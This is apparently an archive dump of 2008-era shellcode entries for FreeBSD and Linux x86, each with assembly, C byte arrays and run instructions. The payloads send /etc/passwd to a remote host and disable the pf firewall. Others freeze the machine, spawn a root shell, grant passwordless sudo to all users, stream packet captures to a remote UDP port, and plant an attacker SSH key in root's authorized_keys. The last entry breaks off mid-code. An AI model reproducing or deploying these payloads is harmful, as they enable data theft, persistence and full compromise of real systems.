{"Title": "FreeBSD/x86 - Reverse (192.168.1.33:8000/TCP) cat /etc/passwd Shellcode (112 bytes)", "Author": "suN8Hclf", "Published": ": 2008-09-10", "Platform": "FreeBSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-166.php", "View": null, "code": ["                           ***(C)oDed bY suN8Hclf***", "                       DaRk-CodeRs Group production, kid", "           [FreeBSD x86 connect back.send.exit /etc/passwd 112 bytes]", "", "This is the FreeBSD version of 0in's shellcode (http://milw0rm.com/shellcode/6263)", "(really learnt a lot while coding this one ;])", "", "Compile:", "nasm -f elf shellcode.asm", "ld -e _start -o shellcode shellcode.o", "================================================================================", "How it works:", "1st terminal:  $nc -l 8000", "2nd terminal:  $./shellcode", "2nd terminal:", "# $FreeBSD: src/etc/master.passwd,v 1.40 2005/06/06 20:19:56 brooks Exp $", "#", "root:*:0:0:Charlie &:/root:/bin/csh", "toor:*:0:0:Bourne-again Superuser:/root:", "daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin", "operator:*:2:5:System &:/:/usr/sbin/nologin", "bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin", "tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin", "kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin", "games:*:7:13:Games pseudo-user:/usr/games:/usr/sbin/nologin", "news:*:8:8:News Subsystem:/:/usr/sbin/nologin", "man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin", "sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin", "smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin", "mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin", "bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin", "[..]", "================================================================================", "Code:", "-------------------------code.asm---------------------", "section .text", "global _start", "", "_start:", "xor eax, eax", "push byte 0x64", "push word 0x7773", "push 0x7361702f", "push 0x6374652f   ;file to open (default:/etc/passwd)", "mov ebx, esp", "push eax", "push ebx", "mov al, 5         ;use: 'cat /usr/src/sys/kern/syscalls.master | grep *' to get the right numbers", "push eax", "int 0x80          ;open()", "", "mov ebx, eax      ;file descriptor to ebx", "xor eax, eax      ;we should clean eax each time we return from int 0x80 ", "xor ecx, ecx", "", "mov cx, 3333      ;3333 bytes is probably enough", "push ecx", "mov esi, esp      ;put our data on the stack", "push esi", "push ebx", "mov al, 3", "push eax", "int 0x80          ;read()", "", "mov ebp, eax", "xor eax, eax", "mov al, 6", "push ebx", "push eax", "int 0x80          ;close()", "", "xor eax, eax", "push eax", "push byte 0x01", "push byte 0x02", "mov al, 97", "push eax", "int 0x80          ;socket()", "", "mov edx, eax      ;socket descriptor to edx", "", "push 0x2101a8c0   ;192.168.1.33, change IT!!!", "push 0x401f02AA   ;port 8000", "mov eax, esp", "", "push byte 0x10", "push eax", "push edx", "xor eax, eax", "mov al, 98", "push eax", "int 0x80         ;connect()", "", "xor eax, eax", "push ebp", "push esi         ;our buffer with data", "push edx", "mov al, 4", "push eax", "int 0x80         ;write()", "", "xor eax, eax", "inc eax", "push eax", "push eax", "int 0x80         ;exit()", "-------------------------code.asm---------------------", "", "C Code:", "-------------------------code.c-----------------------", "#include <stdio.h>", "", "char shellcode[]=", "\"\\x31\\xc0\\x6a\\x64\\x66\\x68\\x73\\x77\\x68\\x2f\\x70\\x61\\x73\\x68\\x2f\\x65\\x74\\x63\"", "\"\\x89\\xe3\\x50\\x53\\xb0\\x05\\x50\\xcd\\x80\\x89\\xc3\\x31\\xc0\\x31\\xc9\\x66\\xb9\\x05\"", "\"\\x0d\\x51\\x89\\xe6\\x56\\x53\\xb0\\x03\\x50\\xcd\\x80\\x89\\xc5\\x31\\xc0\\xb0\\x06\\x53\"", "\"\\x50\\xcd\\x80\\x31\\xc0\\x50\\x6a\\x01\\x6a\\x02\\xb0\\x61\\x50\\xcd\\x80\\x89\\xc2\"", "\"\\x68\\xc0\\xa8\\x01\\x21\"   //<- host address", "\"\\x68\\xaa\\x02\\x1f\\x40\"  // <- port number", "\"\\x89\\xe0\\x6a\\x10\\x50\\x52\\x31\\xc0\\xb0\\x62\\x50\\xcd\\x80\\x31\\xc0\\x55\\x56\\x52\"", "\"\\xb0\\x04\\x50\\xcd\\x80\\x31\\xc0\\x40\\x50\\x50\\xcd\\x80\";", "", "int main(int argc, char **argv) {", "\tint (*func)();", "\tfunc=(int (*)())shellcode;", "\t(int)(*func)();", "}", "-------------------------code.c-----------------------", "", "Greetz to: 0in, cOndemned, e.wiZz!, str0ke, doctor", "Visit us : www.dark-coders.pl", "", "# milw0rm.com [2008-09-10]"]},
{"Title": "FreeBSD/x86 - setreuid + execve(pfctl -d) Shellcode (56 bytes)", "Author": "suN8Hclf", "Published": ": 2008-09-12", "Platform": "FreeBSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-96.php", "View": null, "code": ["                   ***(C)oDed bY suN8Hclf***", "               DaRk-CodeRs Group production, kid", "     [FreeBSD x86 setreuid(0, 0) + execve(pfctl -d) 56 bytes]", "", "The simples way to disable the FreeBSD's packet filter. We do not", "flush all rules (pfctl -F all) but only turn the firewall off.", "", "Assembly code:", "-------------------------code.asm--------------------------", "section .text", "global _start", "", "_start:", "", "\txor eax, eax", "\tpush eax", "\tpush eax", "\tmov al, 126", "\tpush eax", "\tint 0x80           ; setreuid()", "", "\txor eax, eax", "\tpush eax", "\tpush word 0x642d", "\tmov ecx, esp       ; ecx contains a pointer to \"-d\" string", "", "\tpush eax ", "\tpush 0x6c746366", "\tpush 0x702f6e69", "\tpush 0x62732f2f", "\tmov ebx, esp       ; ebx contains a pointer to \"//sbin/pfctl\" string", "", "\tpush eax", "\tpush ecx", "\tpush ebx", "\tmov ecx, esp", "", "\tpush eax", "\tpush ecx", "\tpush ebx", "\tmov al, 0x3b", "\tpush eax", "\tint 0x80          ; execve()", "", "\txor eax, eax", "\tpush eax", "\tpush eax", "\tint 0x80          ; exit()", "-------------------------code.asm--------------------------", "And C code:", "-------------------------code.c----------------------------", "#include <stdio.h>", "", "char shellcode[]=", "\"\\x31\\xc0\\x50\\x50\\xb0\\x7e\\x50\\xcd\\x80\\x31\\xc0\\x50\\x66\\x68\\x2d\\x64\" ", "\"\\x89\\xe1\\x50\\x68\\x66\\x63\\x74\\x6c\\x68\\x69\\x6e\\x2f\\x70\\x68\\x2f\\x2f\"", "\"\\x73\\x62\\x89\\xe3\\x50\\x51\\x53\\x89\\xe1\\x50\\x51\\x53\\xb0\\x3b\\x50\\xcd\"", "\"\\x80\\x31\\xc0\\x50\\x50\\xcd\\x80\";", "", "int main(int argc, char *argv[]){", "\tint (*func)();", "\tfunc=(int (*)())shellcode;", "\t(int)(*func)();", "}", "-------------------------code.c----------------------------", "", "Greetz to: 0in, cOndemned (and to other DaRk-CodeRs members), str0ke, e.wiZz!, ", "           Katharsis, doctor and many others...", "Visit us : www.dark-coders.pl", "", "# milw0rm.com [2008-09-12]"]},
{"Title": "Linux/x86 - iopl(3) + asm(cli) + while(1){} Shellcode (12 bytes)", "Author": "dun", "Published": ": 2008-09-17", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-205.php", "View": null, "code": ["/*", "  :::::::-.   ...    ::::::.    :::.", "   ;;,   `';, ;;     ;;;`;;;;,  `;;;", "   `[[     [[[['     [[[  [[[[[. '[[", "    $$,    $$$$      $$$  $$$ \"Y$c$$", "    888_,o8P'88    .d888  888    Y88", "    MMMMP\"`   \"YmmMMMM\"\"  MMM     YM", "", " \t[ dun[at]strcpy.pl ]", "  ", " [ linux/x86 iopl(3); asm(\"cli\"); while(1){} 12 bytes ]", " ", " ###############################################################", "   iopl(3); asm(\"cli\"); while(1){}", "   // * this code cause freezeing system", " #################################################################", " ", " __asm__(", "\t\"xorl %eax, %eax\\n\"", "\t\"pushl $0x3\\n\"", "\t\"popl %ebx\\n\"", "\t\"movb $0x6e,%al\\n\"", "\t\"int $0x80\\n\"", "\t\"cli\\n\"", "\t\"x1:\\n\"", "\t\"jmp x1\\n\"", " );", "", "*/", "", "", "char shellcode[]=\"\\x31\\xc0\\x6a\\x03\\x5b\\xb0\\x6e\\xcd\\x80\\xfa\\xeb\\xfe\";", "", "int main() {", "", "\tvoid (*sc)();", "\tsc = (void *)&shellcode;", "\tsc();", "\t", "return 0;", "}", "", "// milw0rm.com [2008-09-17]"]},
{"Title": "Linux/x86 - setuid(0) + execve(/bin/sh,0,0) + Null-Free Shellcode (28 bytes)", "Author": "sch3m4", "Published": ": 2008-11-13", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-61.php", "View": null, "code": ["-------------------[ASM]----------------------", "", "global _start", "section .text", "_start:", ";setuid(0)", "xor ebx,ebx", "lea eax,[ebx+17h]", "cdq", "int 80h", ";execve(\"/bin/sh\",0,0)", "xor ecx,ecx", "push ecx", "push 0x68732f6e", "push 0x69622f2f", "lea eax,[ecx+0Bh]", "mov ebx,esp", "int 80h", "", "-------------------[/ASM]----------------------", "", "-------------------[C]----------------------", "", "#include <stdio.h>", "", "const char shellcode[]= \"\\x31\\xdb\"", "            \"\\x8d\\x43\\x17\"", "            \"\\x99\"", "            \"\\xcd\\x80\"", "            \"\\x31\\xc9\"", "            \"\\x51\"", "            \"\\x68\\x6e\\x2f\\x73\\x68\"", "            \"\\x68\\x2f\\x2f\\x62\\x69\"", "            \"\\x8d\\x41\\x0b\"", "            \"\\x89\\xe3\"", "            \"\\xcd\\x80\";", "", "int main()", "{", "    printf <http://www.opengroup.org/onlinepubs/009695399/functions/printf.html>(\"\\nSMALLEST SETUID & EXECVE GNU/LINUX x86 STABLE SHELLCODE\"", "            \"WITHOUT NULLS THAT SPAWNS A SHELL\"", "            \"\\n\\nCoded by Chema Garcia (aka sch3m4)\"", "            \"\\n\\t + sch3m4@opensec.es\"", "            \"\\n\\t + http://opensec.es\"", "            \"\\n\\n[+] Date: 29/11/2008\"", "            \"\\n[+] Thanks to: vlan7\"", "            \"\\n\\n[+] Shellcode Size: %d bytes\\n\\n\",", "            sizeof(shellcode)-1);", "", "    (*(void (*)()) shellcode)();", "", "    return 0;", "}", "", "-------------------[C]---------------------- ", "", "# milw0rm.com [2008-11-13]"]},
{"Title": "Linux/x86 - Promiscuous Mode Detector Shellcode (56 bytes)", "Author": "XenoMuta", "Published": ": 2008-11-18", "Platform": "Linux_x86", "Download": null, "View": null, "code": ["/*", " \u00e2\u2013\u0090\u00e2\u2013\u201e\u00e2\u02c6\u2122 \u00e2\u2013\u201e  \u00e2\u2013\u201e\u00e2\u2013\u201e\u00e2\u2013\u201e .  \u00e2\u2013\u0090 \u00e2\u2013\u201e         \u00e2\u02c6\u2122 \u00e2\u2013\u0152 \u00e2\u2013\u201e \u00c2\u00b7.  \u00e2\u2013\u201e\u00e2\u02c6\u2122 \u00e2\u2013\u201e\u00e2\u2013\u0152 \u00e2\u2013\u201e\u00e2\u2013\u201e\u00e2\u2013\u201e\u00e2\u2013\u201e\u00e2\u2013\u201e  \u00e2\u2013\u201e\u00e2\u2013\u201e\u00e2\u2013\u201e\u00c2\u00b7 ", "  \u00e2\u2013\u02c6\u00e2\u2013\u0152\u00e2\u2013\u02c6\u00e2\u2013\u0152\u00e2\u2013\u00a0 \u00e2\u2013\u20ac\u00e2\u2013\u201e.\u00e2\u2013\u20ac\u00c2\u00b7 \u00e2\u02c6\u2122\u00e2\u2013\u02c6\u00e2\u2013\u0152\u00e2\u2013\u0090\u00e2\u2013\u02c6 \u00e2\u2013\u00a0      \u00c2\u00b7\u00e2\u2013\u02c6\u00e2\u2013\u02c6 \u00e2\u2013\u0090\u00e2\u2013\u02c6\u00e2\u2013\u02c6\u00e2\u2013\u02c6\u00e2\u2013\u00a0 \u00e2\u2013\u02c6\u00e2\u2013\u00a0\u00e2\u2013\u02c6\u00e2\u2013\u02c6\u00e2\u2013\u0152 \u00e2\u02c6\u2122\u00e2\u2013\u02c6\u00e2\u2013\u02c6   \u00e2\u2013\u0090\u00e2\u2013\u02c6 \u00e2\u2013\u20ac\u00e2\u2013\u02c6 ", "  \u00c2\u00b7\u00e2\u2013\u02c6\u00e2\u2013\u02c6\u00c2\u00b7  \u00e2\u2013\u0090\u00e2\u2013\u20ac\u00e2\u2013\u20ac\u00e2\u2013\u00a0\u00e2\u2013\u201e \u00e2\u2013\u0090\u00e2\u2013\u02c6\u00e2\u2013\u0090\u00e2\u2013\u0090\u00e2\u2013\u0152  \u00e2\u2013\u201e\u00e2\u2013\u02c6\u00e2\u2013\u20ac\u00e2\u2013\u201e  \u00e2\u2013\u0090\u00e2\u2013\u02c6 \u00e2\u2013\u0152\u00e2\u2013\u0090\u00e2\u2013\u0152\u00e2\u2013\u0090\u00e2\u2013\u02c6\u00c2\u00b7 \u00e2\u2013\u02c6\u00e2\u2013\u0152\u00e2\u2013\u0090\u00e2\u2013\u02c6\u00e2\u2013\u0152  \u00e2\u2013\u0090\u00e2\u2013\u02c6.\u00e2\u2013\u00a0 \u00e2\u2013\u201e\u00e2\u2013\u02c6\u00e2\u2013\u20ac\u00e2\u2013\u20ac\u00e2\u2013\u02c6 ", " \u00e2\u2013\u00a0\u00e2\u2013\u0090\u00e2\u2013\u02c6\u00c2\u00b7\u00e2\u2013\u02c6\u00e2\u2013\u0152 \u00e2\u2013\u0090\u00e2\u2013\u02c6\u00e2\u2013\u201e\u00e2\u2013\u201e\u00e2\u2013\u0152 \u00e2\u2013\u02c6\u00e2\u2013\u02c6\u00e2\u2013\u0090\u00e2\u2013\u02c6\u00e2\u2013\u0152 \u00e2\u2013\u0090\u00e2\u2013\u02c6\u00e2\u2013\u0152.\u00e2\u2013\u0090\u00e2\u2013\u0152 \u00e2\u2013\u02c6\u00e2\u2013\u02c6 \u00e2\u2013\u02c6\u00e2\u2013\u02c6\u00e2\u2013\u0152\u00e2\u2013\u0090\u00e2\u2013\u02c6\u00e2\u2013\u0152 \u00e2\u2013\u0090\u00e2\u2013\u02c6\u00e2\u2013\u201e\u00e2\u2013\u02c6\u00e2\u2013\u0152  \u00e2\u2013\u0090\u00e2\u2013\u02c6\u00e2\u2013\u0152\u00c2\u00b7 \u00e2\u2013\u0090\u00e2\u2013\u02c6 \u00e2\u2013\u00a0\u00e2\u2013\u0090\u00e2\u2013\u0152", " \u00e2\u02c6\u2122\u00e2\u2013\u20ac\u00e2\u2013\u20ac \u00e2\u2013\u20ac\u00e2\u2013\u20ac  \u00e2\u2013\u20ac\u00e2\u2013\u20ac\u00e2\u2013\u20ac  \u00e2\u2013\u20ac\u00e2\u2013\u20ac \u00e2\u2013\u02c6\u00e2\u2013\u00a0  \u00e2\u2013\u20ac\u00e2\u2013\u02c6\u00e2\u2013\u201e\u00e2\u2013\u20ac\u00e2\u2013\u00a0 \u00e2\u2013\u20ac\u00e2\u2013\u20ac  \u00e2\u2013\u02c6\u00e2\u2013\u00a0\u00e2\u2013\u20ac\u00e2\u2013\u20ac\u00e2\u2013\u20ac  \u00e2\u2013\u20ac\u00e2\u2013\u20ac\u00e2\u2013\u20ac   \u00e2\u2013\u20ac\u00e2\u2013\u20ac\u00e2\u2013\u20ac   \u00e2\u2013\u20ac  \u00e2\u2013\u20ac ", "", "Ho' Detector (Promiscuous mode detector shellcode) ", "by XenoMuta <xenomuta[at]phreaker[dot]net>", "http://xenomuta.tuxfamily.org/", "", "This shellcode uses a stupid, yet effective method", "for detecting sniffing on all interfaces in linux:", "parsing /proc/net/packet, which contains libpcap's", "stats and only one line (56 bytes) when not sniffing.", "*/", "", "char sc[]=", "\"\\x66\\x31\\xC0\"                // xor eax,eax", "\"\\x66\\x50\"                    // push eax", "\"\\x66\\x68\\x63\\x6B\\x65\\x74\"    // push dword 0x74656b63 ; cket", "\"\\x66\\x68\\x74\\x2F\\x70\\x61\"    // push dword 0x61702f74 ; t/pa", "\"\\x66\\x68\\x63\\x2F\\x6E\\x65\"    // push dword 0x656e2f63 ; c/ne", "\"\\x66\\x68\\x2F\\x70\\x72\\x6F\"    // push dword 0x6f72702f ; /pro", "\"\\xB0\\x05\"                    // mov al,0x5            ; open()", "\"\\x66\\x89\\xE3\"                // mov ebx,esp           ; /proc/net/packet", "\"\\x66\\x31\\xC9\"                // xor ecx,ecx           ; O_RDONLY", "\"\\xCD\\x80\"                    // int 0x80", "\"\\x66\\x93\"                    // xchg eax,ebx", "\"\\x6A\\x03\"                    // push byte +0x3        ; read()", "\"\\x66\\x58\"                    // pop eax", "\"\\x66\\x89\\xE1\"                // mov ecx,esp", "\"\\x6A\\x39\"                    // push byte +0x39       ; at most 57 bytes", "\"\\x66\\x5A\"                    // pop edx", "\"\\xCD\\x80\"                    // int 0x80", "\"\\x3C\\x38\"                    // cmp al,0x38           ; if only 56 bytes", "\"\\x74\\x06\"                    // jz 0x40               ; there is no packet", "\"\\x6A\\x01\"                    // push byte +0x1        ; capture. Proceed", "\"\\x66\\x58\"                    // pop eax               ; with shellcode", "\"\\xCD\\x80\"                    // int 0x80              ; else, exit()", "/* ", "Append your shellcode here ", "*/", "\"\\x90\";", "", "main(){(*(void (*)()) sc)();}", "-----BEGIN PGP SIGNATURE-----", "", "iEYEARECAAYFAkkjGO0ACgkQ2LnNaOYR/B1h1QCg2uatkfAzSE5Jgc3bzJmFU/3s", "opMAoLufSxvFoSNl3W+6h5rxmLIcq2Mp", "=ISTU", "-----END PGP SIGNATURE-----", "", "// milw0rm.com [2008-11-18]"]},
{"Title": "Linux/x86 - Edit /etc/sudoers (ALL ALL=(ALL) NOPASSWD: ALL) For Full Access Shellcode (86 bytes)", "Author": "Rick", "Published": ": 2008-11-19", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-62.php", "View": null, "code": ["/*", "Author: Rick", "Email: rick2600@hotmail.com", "", "OS: Linux/x86", "Description: Anyone can run sudo without password", "", "section .text", "\tglobal _start", "", "_start:", "", "\t;open(\"/etc/sudoers\", O_WRONLY | O_APPEND);", "\txor eax, eax", "\tpush eax", "\tpush 0x7372656f ", "\tpush 0x6475732f", "\tpush 0x6374652f", "\tmov ebx, esp", "\tmov cx, 0x401", "\tmov al, 0x05", "\tint 0x80", "", "\tmov ebx, eax  ", "", "\t;write(fd, ALL ALL=(ALL) NOPASSWD: ALL\\n, len);", "\txor eax, eax", "\tpush eax", "\tpush 0x0a4c4c41", "\tpush 0x203a4457", "\tpush 0x53534150", "\tpush 0x4f4e2029", "\tpush 0x4c4c4128", "\tpush 0x3d4c4c41", "\tpush 0x204c4c41", "\tmov ecx, esp", "\tmov dl, 0x1c", "\tmov al, 0x04", "\tint 0x80", "", "\t;close(file)", "\tmov al, 0x06", "\tint 0x80", "", "\t;exit(0);", "\txor ebx, ebx", "\tmov al, 0x01", "\tint 0x80", "", "*/", "", "#include <stdio.h>", "#include <string.h>", "", "char code[] =", "\"\\x31\\xc0\\x50\\x68\\x6f\\x65\\x72\\x73\\x68\\x2f\\x73\\x75\\x64\"", "\"\\x68\\x2f\\x65\\x74\\x63\\x89\\xe3\\x66\\xb9\\x01\\x04\\xb0\\x05\"", "\"\\xcd\\x80\\x89\\xc3\\x31\\xc0\\x50\\x68\\x41\\x4c\\x4c\\x0a\\x68\"", "\"\\x57\\x44\\x3a\\x20\\x68\\x50\\x41\\x53\\x53\\x68\\x29\\x20\\x4e\"", "\"\\x4f\\x68\\x28\\x41\\x4c\\x4c\\x68\\x41\\x4c\\x4c\\x3d\\x68\\x41\"", "\"\\x4c\\x4c\\x20\\x89\\xe1\\xb2\\x1c\\xb0\\x04\\xcd\\x80\\xb0\\x06\"", "\"\\xcd\\x80\\x31\\xdb\\xb0\\x01\\xcd\\x80\";", "", "void main(void) {", "\t", "\tvoid (*shellcode)() = code;", "\tshellcode();", "\t", "}", "", "// milw0rm.com [2008-11-19]"]},
{"Title": "Linux/x86 - Reverse (54321/UDP) tcpdump Live Packet Capture Shellcode (151 bytes)", "Author": "XenoMuta", "Published": ": 2008-11-23", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-64.php", "View": null, "code": ["/*", " linux/x86 connect-back port UDP/54321 & dup2 &", " fork() & execve() /usr/bin/tcpdump -iany -w- \"port ! 54321\"", " 151 bytes", " by XenoMuta", "     _  __                 __  ___      __       ", "    | |/ /__  ____  ____  /  |/  /_  __/ /_____ _", "    |   / _ \\/ __ \\/ __ \\/ /|_/ / / / / __/ __ `/", "   /   /  __/ / / / /_/ / /  / / /_/ / /_/ /_/ / ", "  /_/|_\\___/_/ /_/\\____/_/  /_/\\__,_/\\__/\\__,_/  ", "", "   xenomuta [ arroba ] phreaker [ punto ] net", "", "  http://xenomuta.tuxfamily.org/ - Methylxantina 256mg", "  ", " - God bless you all -", "", "*/", "unsigned char sc[] =", "// <_start>:", "\"\\x6a\\x66\"\t // push   $0x66 ; socketcall()", "\"\\x58\"\t\t // pop    %eax  ; para setear el socket ", "\"\\x6a\\x01\"\t // push   $0x1  ", "\"\\x5b\"\t\t // pop    %ebx", "\"\\x31\\xc9\"\t // xor    %ecx,%ecx", "\"\\x51\"\t\t // push   %ecx", "\"\\x6a\\x02\"\t // push   $0x2  ; SOCK_DGRAM (udp)", "\"\\x6a\\x02\"\t // push   $0x2   ", "\"\\x89\\xe1\"\t // mov    %esp,%ecx", "\"\\xcd\\x80\"\t // int    $0x80", "// IP: 127.1.1.1", "\"\\x68\\x7f\\x01\\x01\\x01\"\t // push   $0x101017f", "// Port: 54321", "\"\\x66\\x68\\xd4\\x31\"\t // pushw  $0x31d4", "\"\\x66\\x31\\xc9\"\t // xor    %cx,%cx", "\"\\x80\\xc1\\x02\"\t // xadd    $0x2,%cl", "\"\\x66\\x51\"\t // push   %cx", "\"\\x89\\xe1\"\t // mov    %esp,%ecx", "\"\\x6a\\x10\"\t // push   $0x10", "\"\\x51\"\t\t // push   %ecx", "\"\\x50\"\t\t // push   %eax", "\"\\x89\\xe1\"\t // mov    %esp,%ecx", "\"\\x89\\xc6\"\t // mov    %eax,%esi", "\"\\xb0\\x66\"\t // mov    $0x66,%al  ; socketcall ()", "\"\\x80\\xc3\\x02\"\t // add    $0x2,%bl   ; para connect()", "\"\\xcd\\x80\"\t // int    $0x80", "\"\\x87\\xde\"\t // xchg   %ebx,%esi  ", "\"\\x6a\\x01\"\t // push   $0x1", "\"\\x59\"\t\t // pop    %ecx", "\"\\x6a\\x3f\"\t // push   $0x3f      ; dup2(socket, stdout)", "\"\\x58\"\t\t // pop    %eax", "\"\\xcd\\x80\"\t // int    $0x80", "\"\\x31\\xd2\"\t // xor    %edx,%edx  ", "\"\\x6a\\x02\"\t // push   $0x2       ; fork()", "\"\\x58\"\t\t // pop    %eax", "\"\\xcd\\x80\"\t // int    $0x80", "\"\\x39\\xd0\"\t // cmp    %edx,%eax  ; el hijo sobrevive", "\"\\x74\\x05\"\t // je     0x4d <_child>", "\"\\x6a\\x01\"\t // push   $0x1       ; adios papa", "\"\\x58\"\t\t // pop    %eax", "\"\\xcd\\x80\"\t // int    $0x80", "//<_child>:", "\"\\x6a\\x0b\"\t // push   $0xb    ; execve() tcpdump -iany -w- \"port ! 54321\"", "\"\\x58\"\t\t // pop    %eax    ; sniffea todo menos a mi mismo.", "\"\\x52\"\t\t // push   %edx", "\"\\x68\\x34\\x33\\x32\\x31\"\t // push   $0x31323334 ; \"port ! 54321\"", "\"\\x68\\x20\\x21\\x20\\x35\"\t // push   $0x35202120", "\"\\x68\\x70\\x6f\\x72\\x74\"\t // push   $0x74726f70", "\"\\x89\\xe7\"\t // mov    %esp,%edi", "\"\\x52\"\t\t // push   %edx", "\"\\x6a\\x2d\"\t // push   $0x2d               ; -w- ( escribe a stdout )", "\"\\x66\\x68\\x2d\\x77\"\t // pushw  $0x772d", "\"\\x89\\xe6\"\t // mov    %esp,%esi", "\"\\x52\"\t\t // push   %edx", "\"\\x6a\\x79\"\t // push   $0x79               ; -iany (todas las interfaces )", "\"\\x68\\x2d\\x69\\x61\\x6e\"\t // push   $0x6e61692d", "\"\\x89\\xe1\"\t // mov    %esp,%ecx", "\"\\x52\"\t\t // push   %edx", "\"\\x6a\\x70\"\t // push   $0x70", "\"\\x68\\x70\\x64\\x75\\x6d\"\t // push   $0x6d756470 ; /usr/bin/tcpdump", "\"\\x68\\x6e\\x2f\\x74\\x63\"\t // push   $0x63742f6e", "\"\\x68\\x2f\\x73\\x62\\x69\"\t // push   $0x6962732f", "\"\\x68\\x2f\\x75\\x73\\x72\"\t // push   $0x7273752f", "\"\\x89\\xe3\"\t // mov    %esp,%ebx", "\"\\x52\"\t\t // push   %edx", "\"\\x57\"\t\t // push   %edi", "\"\\x56\"\t\t // push   %esi", "\"\\x51\"\t\t // push   %ecx", "\"\\x53\"\t\t // push   %ebx", "\"\\x89\\xe1\"\t // mov    %esp,%ecx", "\"\\xcd\\x80\";\t // int    $0x80", "", "", "main(){(*(void (*)()) sc)();}", "", "// milw0rm.com [2008-11-23]"]},
{"Title": "Linux/x86 - Append RSA Key to /root/.ssh/authorized_keys2 Shellcode (295 bytes)", "Author": "XenoMuta", "Published": ": 2008-11-23", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-63.php", "View": null, "code": ["/*", " linux/x86 shellcode to append rsa key to /root/.ssh/authorized_keys2", " keys found at http://xenomuta.tuxfamily.org/exploits/authkey/ ", " ssh -i id_rsa_pwn root@pwned-host", "", " 295 bytes", " by XenoMuta", "     _  __                 __  ___      __       ", "    | |/ /__  ____  ____  /  |/  /_  __/ /_____ _", "    |   / _ \\/ __ \\/ __ \\/ /|_/ / / / / __/ __ `/", "   /   /  __/ / / / /_/ / /  / / /_/ / /_/ /_/ / ", "  /_/|_\\___/_/ /_/\\____/_/  /_/\\__,_/\\__/\\__,_/  ", "", "   xenomuta [ arroba ] phreaker [ punto ] net", "", "  http://xenomuta.tuxfamily.org/ - Methylxantina 256mg", "  ", " - God bless you all -", "", "*/", "unsigned char sc[] =", "//<_start>:", "\"\\x31\\xd2\"\t // xor    %edx,%edx", "\"\\x52\"\t\t // push   %edx", "\"\\x68\\x65\\x79\\x73\\x32\"\t // push   $0x32737965 ; /root/.ssh/authorized_keys2", "\"\\x68\\x65\\x64\\x5f\\x6b\"\t // push   $0x6b5f6465", "\"\\x68\\x6f\\x72\\x69\\x7a\"\t // push   $0x7a69726f", "\"\\x68\\x61\\x75\\x74\\x68\"\t // push   $0x68747561", "\"\\x68\\x73\\x73\\x68\\x2f\"\t // push   $0x2f687373", "\"\\x68\\x74\\x2f\\x2f\\x2e\"\t // push   $0x2e2f2f74", "\"\\x68\\x2f\\x72\\x6f\\x6f\"\t // push   $0x6f6f722f", "\"\\x89\\xe3\"\t // mov    %esp,%ebx", "\"\\x66\\xb9\\x41\\x04\"\t // mov    $0x441,%cx ; O_CREAT | O_APPEND | O_WRONLY", "//<_open>:", "\"\\x6a\\x05\"\t // push   $0x5 ; sys_open()", "\"\\x58\"\t\t // pop    %eax", "\"\\xcd\\x80\"\t // int    $0x80", "//<_write>:", "\"\\x93\"\t\t // xchg   %eax,%ebx", "\"\\x89\\xe6\"\t // mov    %esp,%esi", "\"\\x31\\xd2\"\t // xor    %edx,%edx", "\"\\x52\"\t\t // push   %edx", "\"\\x6a\\x0a\"\t // push   $0xa", "\"\\x68\\x20\\x78\\x78\\x78\"\t // push   $0x78787820 ; contenido de id_rsa_pwn.pub", "\"\\x68\\x31\\x35\\x54\\x4a\"\t // push   $0x4a543531", "\"\\x68\\x56\\x39\\x48\\x57\"\t // push   $0x57483956", "\"\\x68\\x6d\\x75\\x2b\\x38\"\t // push   $0x382b756d", "\"\\x68\\x31\\x35\\x64\\x31\"\t // push   $0x31643531", "\"\\x68\\x64\\x2f\\x71\\x69\"\t // push   $0x69712f64", "\"\\x68\\x52\\x4b\\x61\\x79\"\t // push   $0x79614b52", "\"\\x68\\x70\\x70\\x79\\x6e\"\t // push   $0x6e797070", "\"\\x68\\x35\\x46\\x31\\x6d\"\t // push   $0x6d314635", "\"\\x68\\x55\\x64\\x5a\\x35\"\t // push   $0x355a6455", "\"\\x68\\x4d\\x2b\\x4c\\x63\"\t // push   $0x634c2b4d", "\"\\x68\\x38\\x59\\x41\\x6d\"\t // push   $0x6d415938", "\"\\x68\\x4d\\x42\\x50\\x79\"\t // push   $0x7950424d", "\"\\x68\\x4c\\x44\\x4d\\x58\"\t // push   $0x584d444c", "\"\\x68\\x41\\x34\\x31\\x38\"\t // push   $0x38313441", "\"\\x68\\x65\\x33\\x76\\x4d\"\t // push   $0x4d763365", "\"\\x68\\x48\\x6f\\x78\\x77\"\t // push   $0x77786f48", "\"\\x68\\x34\\x6d\\x46\\x36\"\t // push   $0x36466d34", "\"\\x68\\x48\\x39\\x6f\\x39\"\t // push   $0x396f3948", "\"\\x68\\x56\\x59\\x48\\x6a\"\t // push   $0x6a485956", "\"\\x68\\x4b\\x41\\x74\\x6d\"\t // push   $0x6d74414b", "\"\\x68\\x70\\x7a\\x64\\x71\"\t // push   $0x71647a70", "\"\\x68\\x50\\x2b\\x76\\x4d\"\t // push   $0x4d762b50", "\"\\x68\\x6c\\x47\\x51\\x43\"\t // push   $0x4351476c", "\"\\x68\\x50\\x68\\x4f\\x32\"\t // push   $0x324f6850", "\"\\x68\\x4d\\x37\\x48\\x35\"\t // push   $0x3548374d", "\"\\x68\\x76\\x6b\\x6c\\x47\"\t // push   $0x476c6b76", "\"\\x68\\x37\\x74\\x4f\\x35\"\t // push   $0x354f7437", "\"\\x68\\x54\\x63\\x6e\\x77\"\t // push   $0x776e6354", "\"\\x68\\x36\\x63\\x77\\x65\"\t // push   $0x65776336", 